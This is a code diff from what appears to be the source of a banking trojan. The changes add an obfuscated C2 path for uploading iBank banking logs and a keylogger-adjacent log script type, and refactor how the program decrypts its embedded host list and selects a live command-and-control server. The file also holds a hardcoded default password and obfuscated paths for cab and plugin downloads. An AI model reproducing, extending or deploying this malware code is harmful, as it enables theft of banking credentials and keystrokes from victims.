@@ -140,6 +140,10 @@ const char DefaultPassword[] = "K8DFaGYUs83KF05T";
     const static char PathCab[]         = {'/','g','e','t','/','c','a','b','.','h','t','m','l' ,0};
 	const static char PathPlugins[]     = {'/','s','e','t','/','p','l','u','g','s','.','h','t','m','l',0};
 
+	#ifdef IBankSystemH
+		const static char PathIBank[]   = {'/', 'g', 'e', 't', '/', 'i', 'b', 'a', 'n', 'k', '.', 'h', 't', 'm', 'l',  0};
+    #endif
+
 	#ifdef HunterH
 		const static char PathHunter[]  = {'/','s','e','t','/','h','u','n','t','e','r','.','h','t','m','l',0};
 	#endif
@@ -270,6 +274,7 @@ string GetPrefix(bool CheckBankingMode)
 			case SCRIPT_CAB:          RANGE(true, 10, 12, 34, 36);
 //            case SCRIPT_CAB_PART:     RANGE(true, 13, 15, 37, 39);
 			case SCRIPT_KEYLOGGER:    RANGE(true, 16, 18, 40, 42);
+			case SCRIPT_IBANK_LOG:    RANGE(true, 19, 21, 43, 45);
 //			case SCRIPT_SCREENSHOT:   RANGE(true, 22, 24, 46, 48);
 
 			// Скрипты из папки SET
@@ -501,33 +506,18 @@ string GetActiveHostFromBuf2(const char* Hosts, DWORD EmptyArrayHash, bool Encry
 {
 	//  Функция возвращает хост из буфера
 	string Result;
-	if (AnsiStr::IsEmpty(Hosts))
-    	return Result;
 
-	if (EmptyArrayHash != 0 && AnsiStr::Hash(Hosts) == EmptyArrayHash)
+	TStrEnum E(Hosts, Encrypted, EmptyArrayHash);
+
+	while (E.Next())
 	{
-		// Хосты не вшиты
-		return Result;
+		if (Hosts::CheckHost(E.Line().t_str()))
+		{
+			Result = E.Line();
+			break;
+		}
+
 	}
-
-	PCHAR Host = (PCHAR)Hosts;
-
-	while (*Host != 0)
-	{
-		// декриптуем хост и проверяем его
-        string Tmp = Host;
-		// Расшифровываем данные
-		if (Encrypted)
-			Decrypt(Host, Tmp.t_str());
-
-		if (Hosts::CheckHost(Tmp.t_str()))
-			return Tmp;
-
-		// переходим на другой элемент
-		Host = STR::End(Host);
-		Host++;
-	}
-
 	return Result;
 }
 //-----------------------------------------------------------------------------
